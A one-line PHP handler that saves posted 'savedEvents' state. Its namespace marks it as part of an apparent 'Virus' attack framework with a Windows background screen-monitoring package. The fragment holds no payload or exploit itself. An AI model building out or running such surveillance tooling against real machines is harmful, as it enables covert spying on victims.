<?php

/** @var \Kelvinho\Virus\Attack\Packages\Windows\Background\MonitorScreen\MonitorScreen $this */

$this->setSavedEvents($this->requestData->postCheck("savedEvents"))->saveState();
